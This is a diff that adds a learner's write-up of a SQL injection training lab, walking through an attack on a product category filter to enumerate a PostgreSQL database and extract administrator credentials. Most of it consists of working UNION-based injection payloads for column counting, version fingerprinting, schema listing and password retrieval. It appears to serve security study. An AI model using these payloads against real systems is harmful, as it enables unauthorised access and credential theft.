@@ -1,0 +1,49 @@
+LAB 09: SQL injection attack, listing the database contents on non-Oracle databases
+
+VULNERABLE CATEGORY: In the product category filter
+
+End Goal: Retrieve the usernamea and password and login as the administrator
+
+ANALYSIS:
+1. I will first append single quote(') ==> Gives ma an Internal server error==> so there might be possible of sqli
+
+2. since it's non-oracle database I will try to comment other query with (--) double dash==> yes, and it works it gives me an page with payload(' --)
+
+3. Now, I will try to know how much column is present in there.
+    (3A). ' ORDER BY 1-- ==> It give me an page so there might be more then 1 column
+    (3B). ' ORDER BY 2-- ==> it gives me an page too so there might be more then 2 column
+    (3C). ' ORDER BY 3-- ==> It give me an Internal Server error which proves that there is total (3-1)=2 number of columns
+
+4. Now checking for what types of data holds each column
+    (4A). ' UNION SELECT NULL,NULL--==> Since there is 2 column these gives me an 200 response
+    (4B). ' UNION SELECT 'a','b'-- ==> since a and b showm in the page it proves that the table contains the strings data
+
+5. Now checking for the version
+    *** since this is non-oracle database we can use other database version tricks here
+    (5A). Microsoft ==>SELECT @@version        
+    (5B). PostgreSQL ==>SELECT version()        
+    (5C). MySQL ==>SELECT @@version 
+
+    Let's use this one first:
+    *** ' UNION SELECT NULL,@@version--   ==> this doesnot works
+    *** ' UNION SELECT version(),NULL-- ==> this does works so we know that PostgreSQL is been used as the database
+    *** Now my aim is to Retrieve the username and password
+
+ 6.  Now, as we know this is using a PostgreSQL we can read it documentation.
+      (6A).  SELECT * FROM information_schema.tables
+      (6B). So I have to use UNION attack for it I can do something like:
+      ***' UNION SELECT table_name,NULL FROM information_schema.tables-- ==> this gives me an 200 response and list of table_name
+      users_obxtiq ==> I am guessing this holds the list of username and password
+
+  7. Now use what you got and try to Retrieve the username and password
+     *** SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+     (7A). Using this method we can do that::: 
+       ' UNION SELECT *,NULL FROM information_schema.columns WHERE table_name="users_obxtiq"--   ==> and we need two columns name for the union attack to figure out the column name we will watch at PostgreSQL documentation
+
+      (7B). column_name==> name of the column.
+
+      (7C). Now, ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_obxtiq'--  ==> This gives me 200 response and something like:password_mcojam,username_dyicaz, email columns now I have to Retrieve it.
+
+   8. NOW Retrieve from the 2 tables you get
+    ***SELECT * FROM information_schema.tables
+    (8A). ' UNION SELECT username_dyicaz,password_mcojam FROM users_obxtiq-- ==>  this gives me 200 response (since got an password and username) 
